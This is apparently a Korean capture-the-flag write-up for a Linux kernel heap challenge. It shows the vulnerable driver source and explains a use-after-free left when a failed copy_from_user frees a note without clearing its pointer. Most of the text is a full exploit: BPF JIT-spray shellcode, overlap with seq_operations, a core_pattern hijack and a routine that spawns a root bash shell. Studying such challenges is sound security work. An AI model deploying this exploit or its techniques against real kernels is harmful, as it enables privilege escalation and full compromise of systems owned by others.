# pwn101

# Usage

# Concept
- linux kernel heap exploit

# Writeup
```c++
#include <linux/init.h>
#include <linux/module.h>
#include <linux/types.h>
#include <linux/kernel.h>
#include <linux/fs.h>
#include <linux/cdev.h>
#include <linux/device.h>
#include <linux/gfp.h>
#include <linux/slab.h>
#include <linux/uaccess.h>
#include <asm/current.h>

#define DEVICE_NAME "prob"

#define uint64_t unsigned long long
#define offsetof(TYPE, MEMBER) ((size_t) &((TYPE *)0)->MEMBER)

MODULE_LICENSE("GPL");
MODULE_AUTHOR("qwerty"); 
MODULE_DESCRIPTION("prob");

struct note {
    char data[0x20];
};

struct input {
    uint64_t idx;
    char *data;
};

static dev_t dev_id;
static struct cdev c_dev;
struct mutex mtx;

#define ADD_NOTE 0x10000
#define DEL_NOTE 0x10001
#define GET_NOTE 0x10002

struct note *notes[0x100] = {0, };

static long prob_ioctl(struct file *filp, unsigned int cmd, long unsigned int arg)
{
    struct input inp;

    mutex_lock(&mtx);

    if(copy_from_user(&inp, (void*)arg, sizeof(inp)))
    {
        mutex_unlock(&mtx);
        return -EFAULT;
    }
    
    switch(cmd) {
        case ADD_NOTE:
            if(inp.idx >= 0x100)
            {
                mutex_unlock(&mtx);
                return -EINVAL;
            }
            if(notes[inp.idx] != NULL)
            {
                mutex_unlock(&mtx);
                return -EINVAL;
            }
            notes[inp.idx] = kmalloc(sizeof(struct note), GFP_KERNEL_ACCOUNT);
            if(notes[inp.idx] == NULL)
            {
                mutex_unlock(&mtx);
                return -ENOMEM;
            }
            if(copy_from_user(notes[inp.idx], inp.data, sizeof(struct note)))
            {
                kfree(notes[inp.idx]);
                mutex_unlock(&mtx);
                return -EFAULT;
            }
            break;
        case DEL_NOTE:
            if(inp.idx >= 0x100)
            {
                mutex_unlock(&mtx);
                return -EINVAL;
            }
            if(notes[inp.idx] == NULL)
            {
                mutex_unlock(&mtx);
                return -EINVAL;
            }
            kfree(notes[inp.idx]);
            notes[inp.idx] = NULL;
            break;
        case GET_NOTE:
            if(inp.idx >= 0x100)
            {
                mutex_unlock(&mtx);
                return -EINVAL;
            }
            if(notes[inp.idx] == NULL)
            {
                mutex_unlock(&mtx);
                return -EINVAL;
            }
            if(copy_to_user(inp.data, notes[inp.idx], sizeof(struct note)))
            {
                mutex_unlock(&mtx);
                return -EFAULT;
            }
            break;
        default:
            mutex_unlock(&mtx);
            return -EINVAL;
    }

    mutex_unlock(&mtx);
    return 0;
}

static int prob_open(struct inode *inode, struct file *filp)
{
    return 0;
}

static int prob_release(struct inode *inode, struct file *filp)
{
    return 0;
}

static struct file_operations module_fops = {
    .owner   = THIS_MODULE,
    .open    = prob_open,
    .release = prob_release,
    .unlocked_ioctl = prob_ioctl,
};
 
static int __init prob_init(void)
{
    printk(KERN_INFO "Loading prob module\n");

    mutex_init(&mtx);

    if (alloc_chrdev_region(&dev_id, 0, 1, DEVICE_NAME)) {
        printk(KERN_WARNING "Failed to register device\n");
        return -EBUSY;
    }

    cdev_init(&c_dev, &module_fops);
    c_dev.owner = THIS_MODULE;

    if (cdev_add(&c_dev, dev_id, 1)) {
        printk(KERN_WARNING "Failed to add cdev\n");
        unregister_chrdev_region(dev_id, 1);
        return -EBUSY;
    }

    return 0;
}

static void __exit prob_exit(void)
{
    printk(KERN_INFO "Unloading prob module\n");
    cdev_del(&c_dev);
    unregister_chrdev_region(dev_id, 1);
}

module_init(prob_init);
module_exit(prob_exit);
```

kernel 모듈은 다음과 같습니다. 이 모듈은 0x20 크기의 노트를 저장하는 구조체를 가지고 있으며, 이 노트를 추가하거나 삭제하거나 가져오는 ioctl을 제공합니다. 이때, 노트의 인덱스는 0x100개까지만 사용할 수 있습니다.

취약점은 `ADD_NOTE`에서 발생합니다. `copy_from_user`가 실패하였을 때 할당된 노드를 해제하지만 `nullptr`로 초기화하지 않습니다. 이로 인해 댕글링 포인터가 만들어집니다.
```c++
if(copy_from_user(notes[inp.idx], inp.data, sizeof(struct note)))
{
    kfree(notes[inp.idx]);
    mutex_unlock(&mtx);
    return -EFAULT;
}
```

또한 GFP_KERNEL_ACCOUNT 플래그로 할당되기에 익스플로잇에 사용할 수 있는 구조체가 다양합니다. 그 중 `struct seq_operations` 구조체를 이용하면 ops구조체를 댕글링된 객체와 겹칠 수 있습니다.
```c++
struct seq_operations {
	void * (*start) (struct seq_file *m, loff_t *pos);
	void (*stop) (struct seq_file *m, void *v);
	void * (*next) (struct seq_file *m, void *v, loff_t *pos);
	int (*show) (struct seq_file *m, void *v);
};
```

모든 기본적인 커널 미티게이션(PIE, SMEP, SMAP, KASLR)이 활성화되어 있기 때문에 해당 취약점만 가지고 익스플로잇을 진행하기 위해서는 커널 영역에 원하는 쉘코드를 넣어야 합니다. 이는 [잘 알려진 기법](https://github.com/google/security-research/blob/master/pocs/linux/kernelctf/CVE-2023-3776_lts/docs/exploit.md)이 존재합니다.

위 방법을 사용하지 않아도 다양한 해결 방법이 존재합니다. 대표적으로 아래와 같은 방법으로 해결할 수 있습니다.
1. cross-cache(msg_msgseg 등으로)를 수행 후 다른 객체에 임의쓰기로 AAW획득 후 익스플로잇.
2. 동일한 방법으로 힙 릭 후 seq_operations의 ops를 덮고 릭 한 주소로 stack pivoting.

익스코드는 아래와 같습니다.

### exploit.c
```c++
#define _GNU_SOURCE
#include <stdio.h>
#include <fcntl.h>
#include <stdlib.h>
#include <stdlib.h>
#include <unistd.h>
#include <stddef.h>
#include <stdint.h>
#include <stdbool.h>

#include <sys/types.h>
#include <sys/socket.h>
#include <sys/resource.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/syscall.h>

#include <linux/filter.h>
#include <linux/seccomp.h>

#include "modules/helper.h"

#define ADD_NOTE 0x10000
#define DEL_NOTE 0x10001
#define GET_NOTE 0x10002

struct note {
    char data[0x20];
};

struct input {
    uint64_t idx;
    char *data;
};

// b *0xffffffffc02011f6
int make_note(int fd, int idx, char *data) {
	struct input uinput = {
		.idx = idx,
		.data = data
	};
	if(ioctl(fd, ADD_NOTE, &uinput) < 0)
		perror("ioctl");
}

int get_note(int fd, int idx, char *data) {
	struct input uinput = {
		.idx = idx,
		.data = data
	};
	if(ioctl(fd, GET_NOTE, &uinput) < 0)
		perror("ioctl");
}

int del_node(int fd, int idx) {
	struct input uinput = {
		.idx = idx
	};
	if(ioctl(fd, DEL_NOTE, &uinput) < 0)
		perror("ioctl");
}

static int rlimit_increase(int rlimit)
{
    struct rlimit r;
    if (getrlimit(rlimit, &r))
        perror("rlimit_increase:getrlimit");

    if (r.rlim_max <= r.rlim_cur)
    {
        printf("[+] rlimit %d remains at %.lld", rlimit, r.rlim_cur);
        return 0;
    }
    r.rlim_cur = r.rlim_max;
    int res;
    if (res = setrlimit(rlimit, &r))
        perror("rlimit_increase:setrlimit");
    else
        printf("[+] rlimit %d increased to %lld\n", rlimit, r.rlim_max);
    return res;
}

struct sock_filter filter[0x1000];
int stopfd[2];
char buf[0x1000];
#define SYSCHK(x)                     \
	({                                \
		typeof(x) __res = (x);        \
		if (__res == (typeof(x))-1)   \
			err(1, "SYSCHK(" #x ")"); \
		__res;                        \
	})

int sc(void)
{
    unsigned int prog_len = 0x900;
    /* In current environment, the max instructions in a program is near 0x900
    And we test 0x900 instructions * 0x50 forks * 0x100 sockets * 4 = 180 MB is enough large to spray and worked reliably
    */
    struct sock_filter table[] = {
        {.code = BPF_LD + BPF_K, .k = 0xb3909090},
        {.code = BPF_RET + BPF_K, .k = SECCOMP_RET_ALLOW}};
     
/* 0xb3909090 is NOPsled shellclode to make exploitation more reliable
90       nop
90       nop
90       nop
b3 b8    mov    bl, 0xb8
*/
    for (int i = 0; i < prog_len; i++)
        filter[i] = table[0];
 
    filter[prog_len - 1] = table[1];
    int idx = prog_len - 2;
 
#include "sc.h"
 
    struct sock_fprog prog = {
        .len = prog_len,
        .filter = filter,
    };
    int fd[2];
    for (int k = 0; k < 0x50; k++)
    {
        if (fork() == 0) // use fork to bypass RLIMIT_NOFILE limit.
        {
            close(stopfd[1]);
            for (int i = 0; i < 0x100; i++)
            {
                SYSCHK(socketpair(AF_UNIX, SOCK_DGRAM, 0, fd));
                SYSCHK(setsockopt(fd[0], SOL_SOCKET, SO_ATTACH_FILTER, &prog, sizeof(prog)));
            }
           	write(stopfd[0], buf, 1);
            read(stopfd[0], buf, 1);
            exit(0);
        }
    }
    /* wait for all forks to finish spraying BPF code */
    read(stopfd[1], buf, 0x50);
}

void root(char *buf)
{
	int pid = strtoull(buf, 0, 10);
	char path[0x100];
	printf("run root(), %d\n", getuid());
	// fix stdin, stdout, stderr
	sprintf(path, "/proc/%d/ns/net", pid);
	int pfd = syscall(SYS_pidfd_open, pid, 0);
	int stdinfd = syscall(SYS_pidfd_getfd, pfd, 0, 0);
	int stdoutfd = syscall(SYS_pidfd_getfd, pfd, 1, 0);
	int stderrfd = syscall(SYS_pidfd_getfd, pfd, 2, 0);
	dup2(stdinfd, 0);
	dup2(stdoutfd, 1);
	dup2(stderrfd, 2);
	// just cat the flag
	system("cat /dev/sda;bash");
}


int check_core()
{
    // Check if /proc/sys/kernel/core_pattern has been overwritten
    char buf[0x100] = {};
    int core = open("/proc/sys/kernel/core_pattern", O_RDONLY);
    read(core, buf, sizeof(buf));
    close(core);
    return strncmp(buf, "|/proc/%P/fd/666 %P", strlen("|/proc/%P/fd/666 %P")) == 0;
}

int main(int argc, void *argv[])
{
	cpu_affinity(0);
	rlimit_increase(RLIMIT_NOFILE);  
	socketpair(AF_UNIX, SOCK_STREAM, 0, stopfd);  

	if (argc > 1)
	{
		printf("triggered from core_pattern\n");
		root(argv[1]);
		exit(0);
	}

	if(fork())
	{
		while(true)
		{
			if(check_core())
			{
				printf("core_pattern has been overwritten\n");
				int memfd = memfd_create("x", 0);
				SYSCHK(sendfile(memfd, open("/proc/self/exe", 0), 0,
								0xffffffff));
				dup2(memfd, 666);
				close(memfd);
				// trigger crash
				*(size_t *)0 = 0;
			}	
			sleep(1);
		}
	}

	sc();
	
	int fd1;
	if((fd1 = open("/dev/prob", O_RDWR)) < 0)
		panic("open");
	
	char *fault_addr = (char *)mmap((void *)0x1337000, 0x1000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1, 0);
	if(fault_addr == MAP_FAILED)
		panic("mmap");
	
	fault_addr += 0xfff;
	make_note(fd1, 0, fault_addr);

	int seqfd = open("/proc/self/stat", O_RDONLY);
	del_node(fd1, 0);

	uint64_t data[4];
	for(int i=0; i<4; i++)
		data[i] = 0xffffffffc1000000-0x600;
	make_note(fd1, 0, data);

	printf("[+] overwrite funcptr fin");

	int userbuf = mmap(0xa00000, 0x1000, PROT_READ|PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1, 0);
	memcpy(userbuf, "|/proc/%P/fd/666 %P", 0x30);
	
	read(seqfd, data, 1);
	sleep(1000000);
}
```

### sc.h
```c++
filter[idx--] = (struct sock_filter){.code = BPF_LD+BPF_K, .k = 0x3c90d0ff};
filter[idx--] = (struct sock_filter){.code = BPF_LD+BPF_K, .k = 0x3c14e7c1};
filter[idx--] = (struct sock_filter){.code = BPF_LD+BPF_K, .k = 0x3c70b740};
filter[idx--] = (struct sock_filter){.code = BPF_LD+BPF_K, .k = 0x3c90ff31};
filter[idx--] = (struct sock_filter){.code = BPF_LD+BPF_K, .k = 0x3cf02948};
filter[idx--] = (struct sock_filter){.code = BPF_LD+BPF_K, .k = 0x3ce0b640};
filter[idx--] = (struct sock_filter){.code = BPF_LD+BPF_K, .k = 0x3c08e6c1};
filter[idx--] = (struct sock_filter){.code = BPF_LD+BPF_K, .k = 0x3cd4b640};
filter[idx--] = (struct sock_filter){.code = BPF_LD+BPF_K, .k = 0x3c08e6c1};
filter[idx--] = (struct sock_filter){.code = BPF_LD+BPF_K, .k = 0x3c28b640};
filter[idx--] = (struct sock_filter){.code = BPF_LD+BPF_K, .k = 0x3c08e6c1};
filter[idx--] = (struct sock_filter){.code = BPF_LD+BPF_K, .k = 0x3c00b640};
filter[idx--] = (struct sock_filter){.code = BPF_LD+BPF_K, .k = 0x3c90f631};
filter[idx--] = (struct sock_filter){.code = BPF_LD+BPF_K, .k = 0x3c909058};
filter[idx--] = (struct sock_filter){.code = BPF_LD+BPF_K, .k = 0x3c90d0ff};
filter[idx--] = (struct sock_filter){.code = BPF_LD+BPF_K, .k = 0x3c909050};
filter[idx--] = (struct sock_filter){.code = BPF_LD+BPF_K, .k = 0x3c9030b2};
filter[idx--] = (struct sock_filter){.code = BPF_LD+BPF_K, .k = 0x3c90d231};
filter[idx--] = (struct sock_filter){.code = BPF_LD+BPF_K, .k = 0x3c10e6c1};
filter[idx--] = (struct sock_filter){.code = BPF_LD+BPF_K, .k = 0x3ca0b640};
filter[idx--] = (struct sock_filter){.code = BPF_LD+BPF_K, .k = 0x3c90f631};
filter[idx--] = (struct sock_filter){.code = BPF_LD+BPF_K, .k = 0x3cd08948};
filter[idx--] = (struct sock_filter){.code = BPF_LD+BPF_K, .k = 0x3cf22948};
filter[idx--] = (struct sock_filter){.code = BPF_LD+BPF_K, .k = 0x3c10b640};
filter[idx--] = (struct sock_filter){.code = BPF_LD+BPF_K, .k = 0x3c08e6c1};
filter[idx--] = (struct sock_filter){.code = BPF_LD+BPF_K, .k = 0x3ce5b640};
filter[idx--] = (struct sock_filter){.code = BPF_LD+BPF_K, .k = 0x3c08e6c1};
filter[idx--] = (struct sock_filter){.code = BPF_LD+BPF_K, .k = 0x3cd2b640};
filter[idx--] = (struct sock_filter){.code = BPF_LD+BPF_K, .k = 0x3c08e6c1};
filter[idx--] = (struct sock_filter){.code = BPF_LD+BPF_K, .k = 0x3c00b640};
filter[idx--] = (struct sock_filter){.code = BPF_LD+BPF_K, .k = 0x3c90f631};
filter[idx--] = (struct sock_filter){.code = BPF_LD+BPF_K, .k = 0x3cd78948};
filter[idx--] = (struct sock_filter){.code = BPF_LD+BPF_K, .k = 0x3cf20148};
filter[idx--] = (struct sock_filter){.code = BPF_LD+BPF_K, .k = 0x3ce0b640};
filter[idx--] = (struct sock_filter){.code = BPF_LD+BPF_K, .k = 0x3c08e6c1};
filter[idx--] = (struct sock_filter){.code = BPF_LD+BPF_K, .k = 0x3c79b640};
filter[idx--] = (struct sock_filter){.code = BPF_LD+BPF_K, .k = 0x3c08e6c1};
filter[idx--] = (struct sock_filter){.code = BPF_LD+BPF_K, .k = 0x3c6bb640};
filter[idx--] = (struct sock_filter){.code = BPF_LD+BPF_K, .k = 0x3c08e6c1};
filter[idx--] = (struct sock_filter){.code = BPF_LD+BPF_K, .k = 0x3c00b640};
filter[idx--] = (struct sock_filter){.code = BPF_LD+BPF_K, .k = 0x3c90f631};
filter[idx--] = (struct sock_filter){.code = BPF_LD+BPF_K, .k = 0x3cc20148};
filter[idx--] = (struct sock_filter){.code = BPF_LD+BPF_K, .k = 0x3ce2d348};
filter[idx--] = (struct sock_filter){.code = BPF_LD+BPF_K, .k = 0x3c9020b1};
filter[idx--] = (struct sock_filter){.code = BPF_LD+BPF_K, .k = 0x3c90c931};
filter[idx--] = (struct sock_filter){.code = BPF_LD+BPF_K, .k = 0x3c90320f};
filter[idx--] = (struct sock_filter){.code = BPF_LD+BPF_K, .k = 0x3c9082b1};
filter[idx--] = (struct sock_filter){.code = BPF_LD+BPF_K, .k = 0x3c18e1c1};
filter[idx--] = (struct sock_filter){.code = BPF_LD+BPF_K, .k = 0x3c90c0b1};
filter[idx--] = (struct sock_filter){.code = BPF_LD+BPF_K, .k = 0x3c90d231};
filter[idx--] = (struct sock_filter){.code = BPF_LD+BPF_K, .k = 0x3c90c931};
```